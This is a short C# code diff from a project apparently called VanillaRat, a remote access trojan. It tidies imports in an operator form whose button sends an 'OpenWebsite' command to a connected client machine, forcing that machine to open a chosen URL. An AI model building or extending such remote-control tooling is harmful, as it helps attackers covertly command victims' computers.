@@ -1,12 +1,7 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
+using VanillaRat.Classes;
 
 namespace VanillaRat.Forms
 {
@@ -16,10 +11,13 @@ namespace VanillaRat.Forms
         {
             InitializeComponent();
         }
+
         public int ConnectionID { get; set; }
+
+        //Open website
         private void btnOpen_Click(object sender, EventArgs e)
         {
-            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("OpenWebsite(" + txtLink.Text + ")"));
+            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("OpenWebsite(" + txtLink.Text + ")"));
             Close();
         }
     }
